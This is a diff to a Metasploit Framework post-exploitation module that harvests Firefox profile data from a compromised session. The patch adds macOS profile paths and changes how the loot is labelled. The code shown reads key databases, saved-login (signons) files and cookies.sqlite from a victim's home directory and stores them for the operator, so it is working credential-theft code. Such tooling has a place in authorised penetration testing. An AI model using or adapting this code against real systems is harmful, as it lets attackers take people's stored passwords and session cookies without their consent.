@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -97,7 +97,11 @@ class Metasploit3 < Msf::Post
 		else
 			print_status("We do not have root privileges")
 			print_status("Checking #{id} account for Firefox")
-			firefox = session.shell_command("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
+			if @platform == :osx
+				firefox = session.shell_command("ls #{home}#{id}/Library/Application\\ Support/Firefox/Profiles/").gsub(/\s/, "\n")
+			else
+				firefox = session.shell_command("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
+			end
 
 			firefox.each_line do |profile|
 				profile.chomp!
@@ -105,7 +109,11 @@ class Metasploit3 < Msf::Post
 
 				if profile =~ /\.default/
 						print_status("Found Firefox Profile for: #{id}")
-						return [home + id + "/.mozilla/" + "firefox/" + profile + "/"]
+						if @platform == :osx
+							return [home + id + "/Library/Application\\ Support/Firefox/Profiles/" + profile + "/"]
+						else
+							return [home + id + "/.mozilla/" + "firefox/" + profile + "/"]
+						end
 				end
 			end
 			return
@@ -195,6 +203,8 @@ class Metasploit3 < Msf::Post
 	def download_loot(paths)
 		loot = ""
 		paths.each do |path|
+			print_status(path)
+			profile = path.scan(/Profiles[\\|\/](.+)$/).flatten[0].to_s
 			if session.type == "meterpreter"
 				session.fs.dir.foreach(path) do |file|
 					if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
@@ -203,7 +213,8 @@ class Metasploit3 < Msf::Post
 						fd = session.fs.file.new(file)
 						begin
 							until fd.eof?
-								loot << fd.read
+								data = fd.read
+								loot << data if not data.nil?
 							end
 						rescue EOFError
 						ensure
@@ -217,7 +228,7 @@ class Metasploit3 < Msf::Post
 							mime = "binary"
 						end
 						file = file.split('\\').last
-						store_loot("firefox.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "Firefox #{file} File")
+						store_loot("ff.profile.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
 					end
 				end
 			end
@@ -235,7 +246,7 @@ class Metasploit3 < Msf::Post
 							mime = "binary"
 						end
 						file = file.split('/').last
-						store_loot("firefox.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "Firefox #{file} File")
+						store_loot("ff.profile.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
 					end
 				end
 			end
